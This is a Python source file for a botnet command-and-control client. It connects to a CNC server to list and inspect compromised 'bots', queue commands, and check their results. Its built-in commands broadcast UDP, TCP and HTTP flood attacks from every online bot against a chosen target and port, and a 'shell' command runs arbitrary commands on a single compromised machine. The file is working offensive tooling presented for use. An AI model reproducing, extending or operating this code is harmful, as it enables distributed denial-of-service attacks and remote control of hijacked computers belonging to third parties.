import argparse
import json
import socket
import sys

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text

console = Console()


class CNCClient:
    def __init__(self, host: str, port: int):
        self.host = host
        self.port = port

    def _connect(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.host, self.port))
        return sock

    def _send(self, sock, obj: dict) -> dict:
        sock.sendall((json.dumps(obj) + "\n").encode())
        line = b""
        while not line.endswith(b"\n"):
            chunk = sock.recv(4096)
            if not chunk:
                break
            line += chunk
        return json.loads(line.decode().strip())

    def bots_list(self):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "bots_list"})
            sock.close()
            if resp.get("ok"):
                bots = resp.get("data", [])
                if not bots:
                    console.print("[dim](no bots connected)[/dim]")
                    return

                table = Table(
                    title="Bot List",
                    title_style="bold cyan",
                    border_style="blue",
                )
                table.add_column("ID", style="dim", width=5)
                table.add_column("OS", width=22)
                table.add_column("Arch", width=10)
                table.add_column("Hostname", width=20)
                table.add_column("IP", width=18)
                table.add_column("Status", width=8)

                for b in bots:
                    os_str = f"{b.get('os', '')} {b.get('os_version', '')}".strip()
                    status = b.get("status", "")
                    status_style = "[green]online[/green]" if status == "online" else "[red]offline[/red]"
                    table.add_row(
                        str(b["id"]),
                        os_str,
                        b.get("arch", ""),
                        b.get("hostname", ""),
                        b.get("ip", ""),
                        status_style,
                    )

                console.print(table)
            else:
                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        except ConnectionRefusedError:
            console.print("[bold red]CNC server not running (connection refused)[/bold red]")
        except OSError as e:
            console.print(f"[bold red]Connection error:[/bold red] {e}")

    def bots_count(self):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "bots_count"})
            sock.close()
            if resp.get("ok"):
                d = resp["data"]
                text = Text()
                text.append("Total: ", style="bold")
                text.append(f"{d['total']}  ")
                text.append("Online: ", style="bold green")
                text.append(f"{d['online']}  ")
                text.append("Offline: ", style="bold red")
                text.append(f"{d['offline']}")

                console.print(Panel(text, title="Bot Statistics", border_style="blue"))

                if d.get("by_os"):
                    os_table = Table(show_header=False, box=None, padding=(0, 2))
                    for os_name, count in d["by_os"]:
                        os_table.add_row(f"[cyan]{os_name}[/cyan]", f"[bold]{count}[/bold]")
                    console.print(os_table)
            else:
                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        except (ConnectionRefusedError, OSError):
            console.print("[bold red]CNC server not running[/bold red]")

    def bot_info(self, bot_id: str):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "bot_info", "bot_id": bot_id})
            sock.close()
            if resp.get("ok"):
                b = resp["data"]
                status = b.get("status", "")
                status_style = "[green]online[/green]" if status == "online" else "[red]offline[/red]"

                info = Text()
                info.append(f"  Bot ID:      {b['bot_id']}\n")
                info.append(f"  OS:          {b.get('os', '')} {b.get('os_version', '')}\n".strip())
                info.append(f"  Arch:        {b.get('arch', '')}\n")
                info.append(f"  Kernel:      {b.get('kernel', '')}\n")
                info.append(f"  Hostname:    {b.get('hostname', '')}\n")
                info.append(f"  IP:          {b.get('ip', '')}\n")
                info.append(f"  Status:      {status_style}\n")
                info.append(f"  Session:     {b.get('session_id', '')}\n")
                info.append(f"  First seen:  {_ts_to_str(b.get('first_seen'))}\n")
                info.append(f"  Last seen:   {_ts_to_str(b.get('last_seen'))}\n")

                console.print(Panel(info, title=f"Bot #{b['id']}", border_style="blue"))
            else:
                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        except (ConnectionRefusedError, OSError):
            console.print("[bold red]CNC server not running[/bold red]")

    def cmd_send(self, bot_id: str, module: str, params: dict):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "cmd_send", "bot_id": bot_id, "module": module, "params": params})
            sock.close()
            if resp.get("ok"):
                console.print(f"[bold green]Command queued:[/bold green] [cyan]{resp['cmd_id']}[/cyan]")
            else:
                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        except (ConnectionRefusedError, OSError):
            console.print("[bold red]CNC server not running[/bold red]")

    def cmd_status(self, cmd_id: str):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "cmd_status", "cmd_id": cmd_id})
            sock.close()
            if resp.get("ok"):
                c = resp["data"]
                exit_code = c.get("exit_code", -1)
                exit_style = "[green]" if exit_code == 0 else "[yellow]" if exit_code == -1 else "[red]"

                info = Text()
                info.append(f"  Cmd ID:    {c['id']}\n")
                info.append(f"  Bot:       {c['bot_id']}\n")
                info.append(f"  Module:    {c['module']}\n")
                info.append(f"  Params:    {c['params']}\n")
                info.append(f"  Exit code: {exit_style}{exit_code}[/]\n")
                info.append(f"  Created:   {_ts_to_str(c.get('created_at'))}\n")
                info.append(f"  Completed: {_ts_to_str(c.get('completed_at'))}\n")

                console.print(Panel(info, title=f"Command {c['id']}", border_style="blue"))

                output = c.get("output", "")
                if output:
                    console.print(Panel(output.strip(), title="Output", border_style="green"))
                else:
                    console.print("[dim](no output yet)[/dim]")
            else:
                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        except (ConnectionRefusedError, OSError):
            console.print("[bold red]CNC server not running[/bold red]")

    def ping(self):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "ping"})
            sock.close()
            if resp.get("ok"):
                console.print("[bold green]CNC server: ONLINE[/bold green]")
            else:
                console.print("[bold red]CNC server: ERROR[/bold red]")
        except (ConnectionRefusedError, OSError):
            console.print("[bold red]CNC server: OFFLINE[/bold red]")

    def broadcast(self, module: str, params: dict):
        try:
            sock = self._connect()
            resp = self._send(sock, {"action": "cmd_broadcast", "module": module, "params": params})
            sock.close()
            if resp.get("ok"):
                count = resp.get("sent_to", 0)
                if count > 0:
                    console.print(
                        f"[bold green]Broadcast[/bold green] '[cyan]{module}[/cyan]' "
                        f"to [bold]{count}[/bold] bot(s)"
                    )
                else:
                    console.print(f"[yellow]Broadcast: no online bots to receive '{module}'[/yellow]")
            else:
                console.print(f"[bold red]Error:[/bold red] {resp.get('error')}")
        except (ConnectionRefusedError, OSError):
            console.print("[bold red]CNC server not running[/bold red]")


def _ts_to_str(ts) -> str:
    if ts is None:
        return "N/A"
    from datetime import datetime

    return datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")


def parse_params(args: list[str]) -> dict:
    params = {}
    for a in args:
        if "=" in a:
            k, v = a.split("=", 1)
            params[k] = v
        else:
            params[f"arg{len(params)}"] = a
    return params


def main():
    parser = argparse.ArgumentParser(description="CNC CLI")
    parser.add_argument("--host", "-H", default="127.0.0.1", help="CNC server host")
    parser.add_argument("--port", "-p", type=int, default=8444, help="CNC CLI port")
    parser.add_argument("command", nargs="*", help="CLI command (optional, interactive if omitted)")
    args = parser.parse_args()

    client = CNCClient(args.host, args.port)

    if not args.command:
        console.print("[bold cyan]CNC CLI[/bold cyan] — type [bold]help[/bold] for commands, [bold]exit[/bold] to quit")
        try:
            while True:
                try:
                    line = input("\033[1;36m[CNC]\033[0m> ").strip()
                except (EOFError, KeyboardInterrupt):
                    print()
                    break
                if not line:
                    continue
                _run_command(client, line)
        except KeyboardInterrupt:
            print()
    else:
        _run_command(client, " ".join(args.command))


def _run_command(client: CNCClient, line: str):
    parts = line.split()
    cmd_name = parts[0].lower()

    if cmd_name in ("exit", "quit", "q"):
        sys.exit(0)

    elif cmd_name == "help":
        from rich.markdown import Markdown

        help_md = """\
# CNC Commands

## Monitoring
- **bots list** — List all connected bots
- **bots count** — Show bot statistics (total/online/offline)
- **bot info** `<id>` — Show detailed info for one bot
- **ping** — Check if CNC server is online

## Command Dispatch
- **cmd** `<bot_id>` `<module>` `[key=val ...]` — Send command to one bot
- **cmd status** `<cmd_id>` — Check command result

## Broadcast Attacks (all online bots)
- **udp-attack** `<target>` `<port>` `[threads=N]` `[duration=S]` `[size=B]`
- **tcp-attack** `<target>` `<port>` `[threads=N]` `[duration=S]` `[size=B]`
- **http-attack** `<target>` `<port>` `[threads=N]` `[duration=S]`

## Single Bot
- **shell** `<bot_id>` `<command>` — Execute shell on one bot

## Utility
- **help** — This help
- **exit** — Quit
"""
        console.print(Markdown(help_md))

    elif cmd_name == "bots":
        if len(parts) >= 2 and parts[1] == "count":
            client.bots_count()
        else:
            client.bots_list()

    elif cmd_name == "bot":
        if len(parts) >= 3 and parts[1] == "info":
            client.bot_info(parts[2])
        else:
            console.print("[yellow]Usage:[/yellow] bot info <id>")

    elif cmd_name == "cmd":
        if len(parts) >= 4 and parts[1] == "status":
            client.cmd_status(parts[2])
        elif len(parts) >= 4:
            bot_id = parts[1]
            module = parts[2]
            params = parse_params(parts[3:])
            client.cmd_send(bot_id, module, params)
        else:
            console.print("[yellow]Usage:[/yellow] cmd <bot_id> <module> [params...]")
            console.print("[yellow]       [/yellow] cmd status <cmd_id>")

    elif cmd_name in ("udp-attack", "tcp-attack", "http-attack"):
        if len(parts) < 3:
            console.print(f"[yellow]Usage:[/yellow] {cmd_name} <target> <port> [threads=N] [duration=S] [size=B]")
            return
        atk_type = cmd_name.split("-")[0]
        params = {"type": atk_type, "target": parts[1], "port": parts[2]}
        for extra in parts[3:]:
            if "=" in extra:
                k, v = extra.split("=", 1)
                params[k] = v
            else:
                params[f"arg{len(params)}"] = extra
        client.broadcast("flood", params)

    elif cmd_name == "shell":
        if len(parts) < 3:
            console.print("[yellow]Usage:[/yellow] shell <bot_id> <command>")
            return
        client.cmd_send(parts[1], "shell", {"cmd": " ".join(parts[2:])})

    elif cmd_name == "ping":
        client.ping()

    else:
        console.print(f"[yellow]Unknown command:[/yellow] {cmd_name}. Type [bold]help[/bold] for available commands.")


if __name__ == "__main__":
    main()
